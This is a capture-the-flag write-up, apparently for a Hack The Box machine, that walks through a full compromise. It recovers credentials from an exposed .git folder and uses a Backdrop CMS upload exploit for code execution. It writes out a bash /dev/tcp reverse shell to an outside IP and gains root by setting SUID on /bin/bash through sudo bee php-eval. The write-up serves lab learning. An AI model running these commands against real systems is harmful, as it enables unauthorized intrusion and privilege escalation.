1. Run nmap to discover any open ports from the server. The results are port 22 and 80 are opened. <br>
![image](https://github.com/user-attachments/assets/c61f1343-5f7a-4f18-b698-7034aa7e0666)
2. There is robots.txt file in there, check and there is no interesting information related to the initial access. <br>
![image](https://github.com/user-attachments/assets/ac4e6fe5-3915-4bfe-a81c-e8bb1b2a4c6f)
3. There is a user from the blog but I can't discover any password related to this user. <br>
![image](https://github.com/user-attachments/assets/4369ed99-f7db-48be-b09f-a2b4596b4354)
4. Check again with dirsearch and there is .git folder from the server. <br>
![image](https://github.com/user-attachments/assets/d7097385-ba66-4894-88d2-83dabe0accb4)
![image](https://github.com/user-attachments/assets/8217a6ab-57c9-4cc6-b372-e9732833b5b1)
5. I dump the git content with command **git-dumper http://10.10.11.58/.git/**. <br>
6. Run git-show and found several interesting info such as: <br>
User _> tiffany@dog.htb <br>
Creds -> root:BackDropJ2024DS2024 <br>
![image](https://github.com/user-attachments/assets/7a1f58ec-e8ca-4591-8696-0300ed3559a1)
![image](https://github.com/user-attachments/assets/18e85612-85eb-4ee8-990e-d318cedb3926)
7. A bit rabbithole in here and I try to login with tiffany and the root password. With those creds, I successfully login into the website as admin. <br>
![image](https://github.com/user-attachments/assets/c2d9237b-d0a9-4dd6-a5bf-4031bcf931c2)
8. In the beginning, I discover that the server use backdrop CMS. So I try to use this exploit from this [link](https://www.exploit-db.com/exploits/52021). <br>
![image](https://github.com/user-attachments/assets/cdfe95f3-dd5f-4c20-9d30-d90d6d893171)
9. Follow the steps and change the file extension into .tar. Upload it into the /admin/modules/install page. <br>
![image](https://github.com/user-attachments/assets/2c3a9d12-7d7c-47df-a489-bf04c99da265)
10. Open the modules in /modules path and it shows the shell folder that I made. <br>
![image](https://github.com/user-attachments/assets/f57f888a-9814-4f99-abc3-6eb6758db23d)
11. Open the shell.php file and I successfully do RCE from the file. <br>
![image](https://github.com/user-attachments/assets/94da38f9-1beb-49f4-9ddb-e9143d28e764)
12. Run reverse shell command. <br>
**Command: bash -c "bash -i >& /dev/tcp/10.10.14.68/443 0>&1"** <br>
<img width="336" alt="image" src="https://github.com/user-attachments/assets/d26b5e1c-6734-453b-90fe-72725bfd4a8f" /> <br>
13. Check the home directory and found two users. I tried both with the tiffany password and one of them is worked. <br>
![image](https://github.com/user-attachments/assets/42773726-afce-4f96-8c1f-d227e49bb138)
14. The user.txt is found inside his home directory. <br> 
![image](https://github.com/user-attachments/assets/dc421e1a-b830-4aee-bdfb-3e0e935c8c39)
15. Run sudo -l and /usr/bin/bee service can be run without any root pass. <br>
![image](https://github.com/user-attachments/assets/54033313-6907-423c-a3db-b63cdebf15d2)
16. I check for the command that can be run from the service and I realize that I can run php-eval from the service. <br>
![image](https://github.com/user-attachments/assets/f0809951-2aed-4dfe-9624-82223d754e56)
![image](https://github.com/user-attachments/assets/9082faf4-c68f-4e82-b557-3c5e45bfb417)
17. Try to run whoami with this command. <br>
**Command: sudo /usr/local/bin/bee --root=/var/www/html/ php-eval "system("whoami")"** <br>
<img width="518" alt="image" src="https://github.com/user-attachments/assets/e292cce6-f607-406b-8ecd-ce97c0d65a56" /> <br>
18. It works! Now I'm able to change the /bin/bash privilege into SUID. <br>
**Command: sudo /usr/local/bin/bee --root=/var/www/html/ php-eval "system('chmod u+s /bin/bash')"** <br>
![image](https://github.com/user-attachments/assets/5c2d3c71-3f6e-47ea-9dc9-b6c3025814a9)
19. Run /bin/bash -p to access root shell and the root.txt file found inside the /root directory. <br>
![image](https://github.com/user-attachments/assets/c7c1198e-26d1-4c67-b140-c03811cc6d0a)

























